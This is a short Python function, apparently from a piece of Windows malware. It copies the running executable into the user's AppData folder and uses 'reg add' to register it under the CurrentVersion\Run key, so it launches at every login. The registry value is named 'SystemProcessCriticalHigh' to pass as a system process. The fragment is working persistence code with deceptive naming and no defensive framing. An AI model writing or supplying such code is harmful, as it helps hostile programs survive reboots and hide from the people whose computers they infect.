def run_at_startup():
    global EXEC_NAME
    location = os.environ["appdata"] + f"\\{EXEC_NAME}.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemProcessCriticalHigh /t REG_SZ /d "' + location + '"', shell=True)